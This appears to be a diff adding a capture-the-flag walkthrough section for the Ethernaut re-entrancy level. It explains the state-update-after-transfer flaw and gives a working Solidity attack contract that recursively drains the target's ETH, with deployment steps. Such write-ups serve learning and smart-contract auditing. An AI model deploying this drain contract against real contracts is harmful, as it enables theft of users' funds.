@@ -336,3 +336,59 @@ contract Attack {
     }
 }
 ```
+
+# 10: Re-entrancy
+**Level Link:** [Re-entrancy Challenge](https://ethernaut.openzeppelin.com/level/10)  
+**Bug:** Classic re-entrancy attack  
+**Objective:** Drain all contract ETH  
+**Vulnerability Analysis:**
+```solidity
+function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) {
+        (bool sent,) = msg.sender.call{value: _amount}("");
+        require(sent, "Transfer failed");
+        balances[msg.sender] -= _amount; // ❌ State update AFTER transfer
+    }
+}
+```
+The vulnerable contract reduces balances after sending ETH via call.value(), which triggers the receiver's receive() function. Crucially, this external call hands control to the attacker's contract before state updates occur. If the attacker's receive() function calls withdraw() again:
+
+- The original withdraw() hasn't yet updated balances[msg.sender]
+- The re-entrant call passes the same balance check again
+- Another ETH transfer is initiated, creating a recursive loop  
+
+**Attack Contract:**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract ReentrancyAttacker {
+    Reentrance public target;
+    uint256 public initialDeposit;
+
+    constructor(address payable _target) payable {
+        target = Reentrance(_target);
+        initialDeposit = msg.value;
+        target.donate{value: initialDeposit}(address(this));
+    }
+
+    function attack() external {
+        target.withdraw(initialDeposit);
+    }
+
+    receive() external payable {
+        if (address(target).balance >= initialDeposit) {
+            target.withdraw(initialDeposit);
+        }
+    }
+
+    function withdraw() external {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}
+```
+
+**Steps to attack:**
+- Deploy the contract using remix
+- call the `attack()` function.
